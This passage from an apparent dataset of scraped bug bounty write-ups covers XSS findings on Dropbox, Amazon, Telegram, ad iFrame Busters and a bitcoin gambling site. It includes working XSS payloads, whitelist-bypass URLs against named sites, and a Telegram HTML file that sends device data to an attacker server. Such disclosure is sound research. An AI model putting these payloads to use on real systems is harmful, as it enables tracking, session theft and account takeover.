reward $450 bounty reward. Now which site did I get a reward from? That’s a freelancing website and there’s tons of websites out there that does offer freelancers bounties for their free time. There’s tons that you can find and look for on your own and get a reward for if you Google and looked around. If you have any questions or comments, feel free to message me on Twitter, or tweeting me @Skeletorkeys Thanks for reading. SVG Xss Chainxs Subdomainxss Xss Attack -- -- 4 Written by Friendly 403 followers · 4 following I am Friendly. Your friendly mid-night exploiter. Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.kumar.ninja/2018/09/xss-surveydropboxcom.html", "title": "Kumar: [XSS] survey.dropbox.com", "friendly_explanation": "This is a bug bounty writeup from https://www.kumar.ninja/2018/09/xss-surveydropboxcom.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nKumar: [XSS] survey.dropbox.com Kumar Tuesday, 25 September 2018 [XSS] survey.dropbox.com Introduction : survey.dropbox.com was pointing to mysurveylab.com and any mysurveylab.com's forms was accessible through survey.dropbox.com . This lead to stored xss at survey.dropbox.com because mysurveylab.com's forms were vulnerable to xss. Impact: Nothing as far as I know. Except phishing! POC : Vulnerable section: Timeline : Reported: Jan 14th 2017 Closed as Informative: Jan 14th 2017 MySurveyLab fixed the bug within week(not sure). Posted by Kumar at 11:02 Email This BlogThis! Share to X Share to Facebook Share to Pinterest No comments: Post a Comment Newer Post Older Post Home Subscribe to: Post Comments (Atom) Blog Archive ► 2023 (1) ► April (1) ▼ 2018 (3) ▼ September (2) [XSS] survey.dropbox.com DBID leakage through Dropbox Chooser ► July (1) ► 2017 (1) ► July (1) ► 2015 (1) ► January (1) Powered by Blogger ."}
{"source_url": "https://evanricafort.blogspot.com/2018/08/blind-xss-in-chrome-experiments-google.html", "title": "Redirecting", "friendly_explanation": "This is a bug bounty writeup from https://evanricafort.blogspot.com/2018/08/blind-xss-in-chrome-experiments-google.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRedirecting You're about to be redirected The blog that used to be here is now at http://blog.evanricafort.com/2018/08/blind-xss-in-chrome-experiments-google.html. Do you wish to be redirected? This blog is not hosted by Blogger and has not been checked for spam, viruses and other forms of malware. Yes No Help Help Centre Help Forum Video Tutorials Community Blogger Buzz Developers Blogger API Developer Forum © 1999 – 2025 Google Terms of Service Privacy Content Policy"}
{"source_url": "https://medium.com/@friendly_/self-xss-leads-to-blind-xss-and-reflected-xss-950b1dc24647", "title": "Self XSS leads to blind XSS and reflected XSS. | by Friendly | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@friendly_/self-xss-leads-to-blind-xss-and-reflected-xss-950b1dc24647. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf XSS leads to blind XSS and reflected XSS. | by Friendly | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self XSS leads to blind XSS and reflected XSS. Friendly 3 min read · Aug 6, 2018 -- 3 Listen Share In regards to this tweet: https://twitter.com/Skeletorkeys/status/1026497897871884289 Important Note: This website does not want me to disclose their website name,until they have setup their Bounty Program, which I will disclose in the future if they allow me to — or they will likely do it themselves from my interpretation on what they said. However in this post, I will explain to my best knowledge on how KNOXSS plays a role here, how I got a blind XSS through a self XSS and a reflected XSS. If you message me on Twitter for help, then I will try my best to assist you! But regarding this website will be a straight NO. My reason is simple for that: I do not want to break their privacy nor lose my contact with them, or any other future bounties this website has to offer me. I don’t expect this to work for everyone, or some of you since each websites WAF security is different than-one-and-another — and how it works. Now to the fun part: To XSS yourself on this website was the most trickiest part and difficult part. When I tried to input the following tags : \", ', ><, / and \\ — I saw that they were being filtered in their live support chat and wasn’t being rendered in at all. After spending 20 - 30 mins, I tried some HTML entities and I saw my outputs being rendered in regular tags, so I decided to cook up an image tag XSS. That being said, I used the following HTML entities: &quot;&gt;&lt;img src=x onerror=alert(1);&gt; and my output became \"><img src=x onerror=alert(1);> which then gave me this: OUR MAGICAL CONFIRMATION “1” :D Then their live support team member messaged me saying: “Hey did you send a popup box with a message saying “1”, and I responded with “Yes I did.” That moment I knew I had a blind XSS which reflects back into their Admin Panel. So I quickly cooked up another payload to grab their cookies — the big boys cookies. That moment I knew I had access to their Administrators and Devs account. I swiftly contacted them and their Administrators again and I was asked me if I could login as them and give a proof of concept — which I did. Logged in and changed their names to my name for a bit more proof of concept. They were shocked. They asked me for my PayPal to send me a lil something, something. ;) I was awarded $500 for this with the reason “Security Guy.” Ha. However, I didn’t stop there. Next part is using KNOXSS and Sublist3r — I used Sublist3r which helped me locate and able to find all their subdomains. I found one of their subdomain http://search.websitename.com which wasn’t listed on their website at all and it wasn’t secured at all. Just had a search box, a bunch of outdated information. First I tried \"><svg/onload=alert(1)> and I got no alert. Which was a bummer. I tried every single possible payload I could think of and got no result. So I went to KNOXSS and posted my POST DATA and saw something interesting which was %3E%3CScrip%3E being rendered in the URL as ></Script> . So I did a quick Google and found a payload that was similar to something I was using, and that payload was: 1%3C!%27/*%22/*\\%27/*\\%22/* — %3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm1%20//%3E# I input that in my URL with my POST DATA and got my little confirmation 1. I quickly contacted their Administrators and Devs and explained how dangerous this can be and how bad it could be. They agreed with me and quickly took down that subdomain. I was then rewarded $200 for a reflected XSS and with a little reason: “Try to reflect this back.” They have a great sense of humor. Ha. Total bounty for the day: $700 USD If you have any questions or comments, feel free to message me on Twitter, or tweeting me @Skeletorkeys Thank you for reading and I hope this is informative enough and I do apologize for not sharing that domain with you all. Again, this isn’t my choice it’s the websites choice and I respect that and I hope you guys do as well. I probably used some terms wrong too. Heh. Anyways, thanks for reading. Security Xss Blind Xss Xss Attack Reflected -- -- 3 Written by Friendly 403 followers · 4 following I am Friendly. Your friendly mid-night exploiter. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@friendly_/reflected-xss-primagames-com-c7a641912626", "title": "Reflected XSS Primagames.com. Long story short, I’ve emailed them a… | by Friendly | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@friendly_/reflected-xss-primagames-com-c7a641912626. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS Primagames.com. Long story short, I’ve emailed them a… | by Friendly | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS Primagames.com Friendly 1 min read · Aug 6, 2018 -- Listen Share Long story short, I’ve emailed them a few times, tweeted at them and no answer to fix their security. I have decided to do a full disclosure regarding this. You have a reflected XSS vulnerability located at this domain: https://shop.primagames.com/us/search?p= This was tested on the latest version of Firefox 61.0.1 (64-bit). By entering this payload in the URL, you are able to execute a script (XSS): <img/on=><img/onerror=%27confirm(1)%27src=%23> Press enter or click to view image in full size …. We get the famous confirm(1) to popup! Impact: This allows an attacker to inject custom Javascript codes that can be used to steal information from Primagames’s user base and lure them to malicious websites on the internet on behalf of Primagames’s website. Once again, this post is NOT meant to do anything harmful to the website. I am just a security researcher who is trying to help secure your website — other websites as well. I hope you see this post and fix your issue very soon and secure your users. If you have any questions or comments, feel free to message me on Twitter @Skeletorkeys Thanks for reading. Security Relfected Xss Xss Full Discloure -- -- Written by Friendly 403 followers · 4 following I am Friendly. Your friendly mid-night exploiter. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://randywestergren.com/xss-vulnerabilities-in-multiple-iframe-busters-affecting-top-tier-sites/", "title": "XSS Vulnerabilities in Multiple iFrame Busters Affecting Top Tier Sites - Randy Westergren", "friendly_explanation": "This is a bug bounty writeup from https://randywestergren.com/xss-vulnerabilities-in-multiple-iframe-busters-affecting-top-tier-sites/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS Vulnerabilities in Multiple iFrame Busters Affecting Top Tier Sites - Randy Westergren September 17, 2018 XSS Vulnerabilities in Multiple iFrame Busters Affecting Top Tier Sites For those unfamiliar with modern advertising tech, iFrame Busters are HTML files hosted on publisher sites which allow ad creatives to extend outside of their standard boundaries. These expandable creatives are typically easy to identify on a site — usually the most annoying ads shown on a page. Background The ad tech industry is quite fragmented and processes can differ greatly between vendors. While a complete explanation of ad network delivery is beyond the scope of this post, a basic example will help illustrate how iFrames and iFrame Busters are often used with expandable creatives. As an example, a simple (non-expanding) creative being delivered on a publisher’s page is shown below: Note the src attribute of the iFrame points to the advertiser’s domain which embeds the desired creative. Nothing special here — this is exactly how any other externally pointing iFrame would function. Also, notice the iFrame’s size is restricted to 300×250 — a standard ad slot size. The ad cannot extend display beyond its frame size, nor can it manipulate the DOM in the top-level page due to same-origin policy . In order to work around this and allow a specific ad vendor to bypass SOP, vendor iFrame Busters (special HTML files) are often provided to be hosted on a publisher’s domain. A simple iFrame Buster ( buster.html ) might look like this: <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"> <html> <body> <script type=\"text/javascript\" language=\"javascript\"> var _url = \"http://www.domain.com/bust.js?\" + document.location.search; var _script = document.createElement(\"script\"); _script.setAttribute(\"type\", \"text/javascript\"); _script.setAttribute(\"src\", _url); document.body.appendChild(_script); </script> </body> </html> An example publisher page ( index.html ) eventually embedding the above iFrame Buster is below: <html> <head> <title>Example Host Site</title> <base href = \"https://hostsite.com\" /> </head> <body> <div id=\"content\"> Test Example </div> <div id=\"banner_ad\"> <!-- Step 2: Initial external creative ad is rendered --> <iframe src=\"//ad-creative.com/showad.html?expandable=1&foo=bar\"> <!-- External ad vendor creative (banner ad) typically rendered here --> <!-- Step 3: Expandable ad placement identified, redirect to https://hostsite.com/buster.html?params=here --> </iframe> </div> </body> <script> // Step 1: Ad Vendor bidding/creative logic adObj.init(\"banner_ad\"); </script> </html> As you can see in step 3, the iFrame embedding the initial ad is redirected to the host page’s domain where the buster.html file resides. The buster file then has access to the parameters provided in the URL from the redirection, referencing them for the behavior of the specific ad impression. As noted above, iFrame Busters are vendor-specific — this means a given publisher may be asked to host a multitude of third-party HTML files to support expandable functionality. In fact, until recently, Google provided a multi-vendor iFrame Buster kit for download within their DoubleClick AdExchange documentation . Vulnerabilities After Google initially announced the recommended removal of several busters in their kit from publisher domains, I decided to review some of the remaining busters as well as the more popular ones not used by DoubleClick. I identified DOM-based XSS vulnerabilities in most of these busters and, though I won’t walk through every one of them, I wanted to cover a few of the more interesting examples in this post. Adform IFrame Manager (1.7.48) I’ll begin with an older version of Adform as a simple example. The relevant source is below: /* Adform.IFrameManager.js, version 1.7.48 Copyright Adform http://www.adform.com Date: 2016-08-24 13:50:17 */ (function(c, b) { if (!b.CACHE) { c.ADF_STUB = !0; var a = location.hash.split(\"#\"), a = 2 < a.length ? a[2] : a[1].split(\"%23\").slice(1).join(\"%23\"); if (!/^(https?:|)\\/\\/(?:[^\\/]+?\\.)(adform|adformdsp)\\.(com|net|local)(\\/|$)/i.test(a)) throw Error('Invalid \"host\"'); b.document.write('<script src=\"' + a + '\">\\x3c/script>') } })(Adform = window.Adform || {}, window); As you can see, this buster simply accepts a source URL that will be written out to the DOM as an external JavaScript source. The related regex test above is attempting to whitelist the allowed domains from which the passed script source URLs will originate. Breaking the regex down, we can see the URL must start with “https://” and end with “{almost_anything}.adform.com” — with the exception of forward slashes, any other characters are allowed in between. Due to this poor restriction, bypassing the whitelist is easy for an attacker. For example, to embed an attacker script instead, we could use: https://hostsite.com/adform/IFrameManager.html##https://randywestergren.com\\iframe-buster-poc.js?test.adform.com This satisfies the regex rules using a GET parameter (test.adform.com) and a malformed URL path (backslash rather than forward). As you’ll see in the following examples, most of the identified vulnerabilities follow a similar pattern of weak whitelist implementations. Eyeblaster (Add in Eye) The addineye iFrame Buster is still seen live on numerous top tier sites. Since the full source code is a bit lengthy, I’ll include it in a gist here . The vulnerability is found in _prepareVerificationJsonObj where a JSON object is prepared from the attacker-controlled document.location.search string: /* Snipped for brevity */ _prepareVerificationJsonObj: function(strHtml) { var strObj = {}; var arrData = strHtml.split(\"::\"); strObj.addineyeDomain = arrData[0] ? arrData[0] : \"\"; strObj.ebBs = arrData[1] ? arrData[1] : \"bs.serving-sys.com\"; strObj.ebProtocol = arrData[2] ? arrData[2] : \"http://\"; return strObj; } _handleAddIneyeVerification: function(strHtml) { var myAddInEyePos = strHtml.indexOf(\"strAie\"); var strAddInEye = \"\"; if (myAddInEyePos != -1) { myAddInEyePos += 6; strAddInEye = strHtml.substr(myAddInEyePos); strAddInEye = unescape(strAddInEye); addInEyeObj = this._prepareVerificationJsonObj(strAddInEye); this._sendAddInEyeVerificationToServer(addInEyeObj); } } _sendAddInEyeVerificationToServer: function(addInEyeObj) { var addineyePipe = \"\"; if (addInEyeObj) { addineyePipe = addInEyeObj.ebProtocol + addInEyeObj.ebBs + \"/BurstingPipe/adServer.bs?cn=dmvld&dm=\" + addInEyeObj.addineyeDomain; document.write(\"<scr\" + \"ipt src='\" + addineyePipe + \"'></scr\" + \"ipt>\"); } } Follow the JSON object eventually passed to _sendAddInEyeVerificationToServer and see it’s derived from a double-colon delimited string found in the strAie query string parameter. As you can see, an arbitrary domain and path can be set within _prepareVerificationJsonObj without a whitelisting check. A few full (and live) PoC URLs look like this: http://www.cnn.com/eyeblaster/addineyeV2.html?strBanner=1&strAie::randywestergren.com/iframe-buster-poc.js?::https:// https://www.fandango.com/eyeblaster/addineyeV2.html?strBanner=1&strAie::randywestergren.com/iframe-buster-poc.js?::https:// https://www.forbes.com/eyeblaster/addineyeV2.html?strBanner=1&strAie::randywestergren.com/iframe-buster-poc.js%3f::https:// Adtech Adtech has another interesting example of a whitelist weakness. Here is the source code: var allowed_domains = ['adserver.adtech.de', 'adserver.adtechus.com', 'aka-cdn.adtech.de', 'aka-cdn-ns.adtech.de', 'pictela.net' ]; try { var adtechIframeHashArray = self.document.location.hash.substring(1).split('|ifv|'); var domain = adtechIframeHashArray[0].match(/https?:\\/\\/([^:^\\/]*)/i)[1]; for (var d in allowed_domains) { if (allowed_domains[d] == domain) { document.write('<scr' + 'ipt type=\"text/javascript\" src=\"' + adtechIframeHashArray[0] + '\"></scr' + 'ipt>'); break; } } } catch (e) {} In this implementation, the code first attempts to extract the domain from the passed script URL and determines if it exists in the allowed_domains whitelist array. The weakness in the regex may not be easy to spot at first, but notice how it considers anything before a colon as the parsed domain. To bypass this, an attacker simply needs to satisfy the whitelist while making the browser actually request a file from another source. This can be done by providing embedded basic authentication credentials in the URL. An example live PoC: http://www.ticketmaster.co.uk/adtech/iframeproxy.html#https://adserver.adtech.de: [email protected] /iframe-buster-poc.js?test.adform.com|ifv| Please note this PoC will not work in Chrome since embedded credential support has been blocked since version 59 — although it still works in most other browsers, including Firefox. Jivox A final example of an iFrame Buster with a different kind of weakness resulting in XSS. The relevant source: var parameters = {}; function getValueWithDefault(key, input, defaultValue) { if (input != null && array_key_exists(key, input)) return input[key]; return defaultValue; } function array_key_exists(key, search) { return (typeof search[key] != \"undefined\"); } function initIBuster() { try { var queryString = unescape(document.location.search.substr(1)); var queryParameters = queryString.split('&'); for (var i = 0; i < queryParameters.length; i++) { var keyValue = queryParameters[i].split('='); parameters[keyValue[0]] = keyValue[1]; } var iBusterResourceURL = getValueWithDefault(\"iBusterResourceURL\", parameters, \"\"); iBusterResourceURL = iBusterResourceURL.split(\".\"); var filePath = getValueWithDefault(\"filePath\", parameters, \"\"); document.write(unescape('%3Cscript src=\"' + iBusterResourceURL[0] + '.jivox.com/player/' + getValueWithDefault(\"iBusterVersion\", parameters, \"\") + '/iBuster.js\" type=\"text/javascript\" %3E%3C/script%3E')); } catch (e) {} } initIBuster(); As far as an attacker is concerned, the important variable that we want to control is the iBusterResourceURL which is ultimately used to populate the script tag’s src attribute. The parent domain is already provided in the string writing to the DOM — this means we just need to sneak our own legitimate URL before this string is appended while making the rest irrelevant to the actual request. Importantly, there is also a split occuring on period characters, meaning the first subdomain of the passed URL is what the code’s author had anticipated receiving. Also, notice there is an unescape called before the document.write . This means we can use double-encoding to satisfy both of these conditions to bypass the restriction: https://www.foxnews.com/jivox/jivoxIBuster.html?iBusterResourceURL=https://randywestergren%252Ecom/iframe-buster-poc%252Ejs%23 Which, after URL decoding, makes the iBusterResourceURL value: https://randywestergren%2Ecom/iframe-buster-poc%2Ejs# And finally, after the unescape : https://randywestergren.com/iframe-buster-poc.js# The hash (fragment identifier) at the end makes the remaining hard-coded characters ineffective at controlling the URL. Disclosure I prepared a report detailing the additional vulnerable busters and submitted it to Google’s security team. They responded quickly, confirmed the vulnerabilities, and removed the files. Although it didn’t qualify for a reward, they did add me to their Hall of Fame . Here’s the timeline: 2018-01-03 Initial report to Google 2018-01-04 Report accepted 2018-01-05 Discussion/clarification on specific vendor 2018-01-16 Marked fixed by Google Best Practices Using regular expressions with whitelisting logic can be risky and difficult. If domain parsing/whitelisting is needed in JavaScript, a better solution is to use the DOM API: var e = document.createElement(\"a\"); e.href = \"https://randywestergren.com/test?test123\"; e.hostname; // => \"randywestergren.com\" Share this: ↑ Home About Proudly powered by WordPress | Theme: Fastr by Kanishk ."}
{"source_url": "http://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/", "title": "WRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers twins, who really care about your security?] – @omespino", "friendly_explanation": "This is a bug bounty writeup from http://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers twins, who really care about your security?] – @omespino Skip to content Menu BLOG EN ESPAÑOL @omespino just another security blog. Written by omespino July 16, 2018 January 7, 2022 WRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers twins, who really care about your security?] Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about Telegram/Whatsapp bug bounty that is very great because this was my first Bitcoin bug bounty payment : This blogpost appeared first in the book Bug Bounty Write Ups Collection [Note] the vulnerability was exactly the same so [It was accepted by Telegram but marked as N/A by Whatsapp (Facebook Whitehat team) ], I just going to describe the process once, also I called “Blind” XSS stored because I couldn’t get a popup alert, but the javascript code rendered anyway. Title: Blind XSS Stored on Telegram app (iOS) via html file. Product / URL: ​ Telegram iOS app Description and Impact​: ​The attackers can store and render arbitrary HTML/Javascript code via HTML file in the background since Telegram iOS doesn’t sanitize any code in the webview inside the app. In this case the impact is: – The attacker can know when the user read the message and when was the last user online activity even if is “last seen” and “read receipts” are turned off. – The attacker can fingerprint the user device with navigator object that contains interesting info from the user device, iOS version, iOS device, language – The attacker can get the victim IP and at least know what is current user city location with any service online like https://www.elhacker.net/geolocalizacion.html POC: 1.- “As attacker”: Login to your Telegram account in any client and upload a html file with the following content and send it via message (ggwp.htm file attached): ggwp.html file content (transcript): <!-- script that load a firebug lite version to get the webview debuggin console inside the app --> <script src='https://getfirebug.com/firebug-lite-debug.js'></script> <script> // iterating the navigator object that contain interesting info from the user device, iOS version, iOS device, language var nav = {}; for (var property in navigator) { nav[property] = navigator[property]; } // tracking when the user open the file with the date var d = new Date(); var nav_formated = '<pre><h1>'+ document.location + '</h1><h2>' + d + ','+ JSON.stringify(nav, null, 2) + '</h2><pre>'; // writting the results document.write(nav_formated); // send data to the 'attacker server' send_response(nav_formated); function send_response(response){ var o_req = new XMLHttpRequest(); o_req.open('POST','http://192.168.1.120:8090'); o_req.send(response); } </script> 2.- Run the “attacker server” and wait for the victim open the file (in my case was my own computer in my lan with the IP 192.168.1.120 and run the server with nc -lvvv 8090) 3.- “As victim”: open the file in Telegram iOS and see the results that the victim just sent to the “attacker sever” – The document.location – The navigator object Note: Also you can notice that the Firebug lite debug console renders without any problem and is fully functional. 4.- “As attacker”: see the results caught in the “attacker sever” Environment: iPhone 6 – iOS v11.2.5. iPhone 7 – iOS v11.2.6 Telegram iOS app Version 4.7.1 My personal account and the server was “hosted” in my own LAN. Tools: Any unix like terminal with​ netcat installed Is this bug public or known by third parties?​: No​ Can I reproduce this issue every time? Yes How did I find this bug? Manually / Other Summarizing , this clearly demonstrates how these companies manage this kind of vulnerabilities, in the one hand Telegram demonstrates actually how they worry about the user fingerprinting and Facebook demonstrated that don’t care. PS. here part of my conversation with Facebook whitehat team. Timeline: 22 Mar 2018: Initial report (Both platforms) 26 Mar 2018: Telegram Security team member send me a response: “Thank you very much for taking an interest in what we do and finding this issue. It will be fixed in the upcoming release. We would like to award you with a bounty of EUR **** for helping us identify it. I’m cc-ing ******* who will help you collect. “ 26 Mar 2018: Facebook Security team member ask me for more details. 26 Mar 2018: I replied Facebook Security team with more details. 29 Mar 2018: Facebook Security team closed as N/A. 10 Apr 2018: I got the Bitcoin transfer from Telegram Security team. [Profit] sometime in July 2018: Telegram iOS app fixed so I decided to make public this patched vulnerability. well that’s it, share your thoughts, what do you think about how they handle that security issue? if you have any doubt, comments or suggestions just drop me a line here or on Twitter @omespino , read you later. Facebook Tweet LinkedIn Shares 13 Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name Email Website Post navigation Previous Post WRITE UP – TWITTER BUG BOUNTY [Report of my 1st bugbounty]: “POODLE SSLv3 bug on multiple twitter smtp servers” Next Post WRITE UP – LOVE STORY, FROM CLOSED AS INFORMATIVE TO $3,500 USD, XSS STORED IN YAHOO! IOS MAIL APP @OMESPINO BLOG EN ESPAÑOL"}
{"source_url": "https://medium.com/@codingkarma/how-i-found-xss-on-amazon-f62b50f1c336", "title": "How I found XSS on Amazon?. I recently started with “Bug Bounty”… | by Coding_Karma | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@codingkarma/how-i-found-xss-on-amazon-f62b50f1c336. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found XSS on Amazon?. I recently started with “Bug Bounty”… | by Coding_Karma | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found XSS on Amazon? Coding_Karma 3 min read · Jul 26, 2018 -- 2 Listen Share I recently started with “Bug Bounty” after hearing and reading so much about it. I felt like it might be worth the efforts to actually try it out & guess what? It’s absolutely is! As a beginner to anyone whose reading this post please always think about the impact “Imagine you are the bad guy and the evaluate your findings. Before running to submissions”. Coming back to the topic XSS on amazon. So as always I was trying to “Hunt” for bugs on some program on some website and feeling absolutely drained so I started reading some posts about XSS and thought why not try it out myself. After playing around some websites I came across “developer.amazon.com”. so I created my account with “<script>alert()</script>” as you might have expected (*Beginner*). After initial futile efforts I started looking at the pattern of request and noticed that name for a feature called “Security Profile” is being directly thrown in the source code and can be elevated to XSS. So I created the security profile with bunch of payload in place of names. Press enter or click to view image in full size This is how the profiles looked like So once the payload is placed I wanted to trigger it so I ended up calling the “Dash Services” which I came to know is the place to trigger after looking at the request-response pattern! Press enter or click to view image in full size and I hit “Begin”. Press enter or click to view image in full size Document.Cookie and my payload executed. So this is not the moment of joy as this is known as “Self-XSS” meaning you can only inject payload on yourself and can’t harm anyone else with it. I ended up escalating this issue to logout CSRF which indeed ended up as a valid issue. Lessons :- Every XSS isn’t XSS that’s a game winner. If you find a vulnerability that is limited always try to escalate it to something more severe. Bug bounty isn’t easy and takes time learn through the process don’t “Quit”. For the love of god listen to people more experienced and don’t act like an idiot. Read blogs/posts/write ups to get started and learn new methods! Have Patience! Lots of it. Time Line :- Reported on 17th July. Issue Acknowledged and Triaged on 18th July. Fixed 24th July. Amazon didn’t offer any momentary reward because they don’t have the policy for the bounties. Before I end this post I would really like to thank @ Karel_Origin and Robert Smith for helping me out with my journey to bug bounty. Thank You! Security Bug Bounty Infosec Cybersecurity Hacking -- -- 2 Written by Coding_Karma 328 followers · 6 following https://www.linkedin.com/in/saubhagya-srivastava-16aa76125/ Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/", "title": "The $12,000 Intersection between Clickjacking, XSS, and Denial of Service", "friendly_explanation": "This is a bug bounty writeup from https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe $12,000 Intersection between Clickjacking, XSS, and Denial of Service ‹ Back Introduction \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty What about pasting links to the same domain? Some time later... How could this be weaponized? \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Conclusion ‹ Back The $12,000 Intersection between Clickjacking, XSS, and Denial of Service Wed Jul 04 2018 One of the more challenging tasks in web app pentesting is approaching an application that has limited interaction. It's very easy to give up after trying every common method to exploit something, but putting in the time to understand an application is often rewarding and beneficial to ones personal growth as a hacker. Introduction The specific application that I've been targeting over the last few weeks is a bitcoin gambling website where a stock will progressively rise over time. The gambler decides the amount of money they would like to put in and a multiplier to payout at. As the multiplier goes up, they have an option to click a button and receive whatever returns they had made it to. Each time the multiplier goes up, there is a chance the stock will \"bust\" and all of the investment will be lost. The application had a few really interesting functionalities, but the one I really wanted to spend time on was the ability to chat with other users. \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty One of the things that I had identified after scrolling through the chat messages was that the service auto-created hyperlinks when a link was pasted. This was interesting since the website made a really special HTML element that is oftentimes dangerously implemented so that an attacker could do one of the following... < a href = \":1\" > :2 </ a > \" onmouseover=alert(1) a=\" - this would fire at :1 if not sanitized properly javascript:alert(1) - this would fire at :1 if not sanitized properly <script>alert(1)</script> - this would fire at :2 if not sanitized properly Sadly, none of these worked. It appeared that the service did not hyperlink the external endpoints directly, but modified it to the following endpoint where www.google.com would be an example posted URL... https://www.bustabit.com/external?url=https://www.google.com ...the result of posting a URL... ... the page that you're taken to after clicking said URL. What about pasting links to the same domain? We'll come back to the above endpoint shortly, but something interesting about the external forwarding service was that it did not forward URLs for the same domain. There was some sort of detection mechanism for determining if a URL was from the same site, e.g. www.bustabit.com/a would not trigger the domain to be modified to www.bustabit.com/external?url=www.bustabit.com/a since it was on the same domain. Here is the generated HTML for www.bustabit.com/a ... < a href = \"/a\" > www.bustabit.com/a </ a > ... compared to the generated HTML for www.google.com/a ... < a href = \"https://www.bustabit.com/external?url=https://www.google.com/a\" > https://www.google.com/a </ a > The really cool part about the above URL is that it's not hyperlinking the full domain, but simply the endpoint. What an attacker could potentially do here is abuse the functionality of double slashes for external resources using a payload like... https://www.bustabit.com//attacker.com/hacked ... to create ... < a href = \"//attacker.com/hacked\" > www.bustabit.com//attacker.com/hacked </ a > This worked! The following HTML is the exact same hyperlink above: //hacker.com/ Notice how it takes you to an external resource and not an endpoint on samcurry.net ? More information on this is available here: http://www.ietf.org/rfc/rfc2396.txt . This WOULD'VE WORKED as a bypass to the link filter, but this was an all-JavaScript application that was doing an onclick event to load the endpoint in the same tab since the domain was the exact same and it didn't have to refresh whatsoever. Damn! It's incredibly frustrating seeing your PoC HTML written in the client, hovering over a hyperlink with a link to whywontyouload.com , then clicking it and nothing happening. After investigating this for a bit I got really annoyed and worked to identify what exactly was happening when I clicked the URL. Some time later... After a long time endlessly spamming random payloads and attempting to find something that would take a user to an external domain, the website went gray. It turns out that I had actually broken my client by sending https://www.bustabit.com/%0t . The JavaScript didn't know how to handle this since the URL encoding for %0t did not decode to anything and simply failed the entire application (see here for more information regarding correct URL encoding). After refreshing the page I was amazed: my client was still broken. It turns out that the application pushed all hyperlinks to a JavaScript function automatically, and if there was a failed URL (e.g. had %0t ), the application would crash. How could this be weaponized? An attacker could direct message anyone placing a bet (this is public information - all live bets and wagers are in the upper right box) and it would crash the victims client, making them unable to cash out their bet. Additionally, an attacker could simply post a bad link to the main chat channel and disconnect everyone, making the game unplayable for a long period of time or cancelling the ability to interact for all users. \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Remember that external endpoint I had posted above? It turns out that you could simply pass it a JavaScript URI and an attacker could execute JavaScript within the context of the application. These bugs always suck because they require you to convince someone to click something. One of the things you can do to make these PoCs better is to simply check if the website can be put inside of an <iframe> tag. If this is possible, then it would additionally be possible to create a clickjacking PoC using something like Samy Kamkar's quick jacking PoC generation tool . It turns out that the service was able to be placed inside of an <iframe> . With this, I generated an example PoC using that awesome little snippet of Click here to continue . Which, in a real world scenario, could look a little something like this... So, what can you do with XSS? Session takeover! It turns out that the web sockets session is stored within the local storage of your browser. An attacker could abuse the XSS to force the victim into making a call to an external service with their session information. An attacker could authenticate to the application by modifying their own secrets to the victims and authenticating to the service. Conclusion More often than not I see people approaching bug bounty with a very \"spray everything lightly\" methodology. This will probably work eventually, but the thing you have to keep in mind is that every one can download automated tools like aquatone or dirsearch. If you want to find vulnerabilities on things where there are thousands of other researchers, it is often your best bet to dig deep on certain functionalities. If you have any questions feel free to use the contact form above or simply follow me on Twitter ! Find me on: twitter : https://twitter.com/samwcyo discord : zlz RSS Twitter"}
